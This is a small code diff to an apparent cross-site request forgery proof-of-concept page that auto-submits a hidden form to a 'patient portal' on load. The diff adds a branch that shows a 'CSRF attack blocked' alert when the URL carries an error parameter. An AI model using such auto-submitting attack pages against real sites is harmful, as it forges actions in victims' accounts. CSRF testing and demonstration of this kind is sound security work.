@@ -24,8 +24,13 @@
     </form>
 
     <script>
-        document.getElementById('csrf-form').submit();
-        console.log('Malicious form submitted to patient portal. User pwned.');
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('error')) {
+            alert('CSRF attack blocked by the server');
+        } else {
+            document.getElementById('csrf-form').submit();
+            console.log('Malicious form submitted to patient portal. User pwned.');
+        }
     </script>
 </body>
 
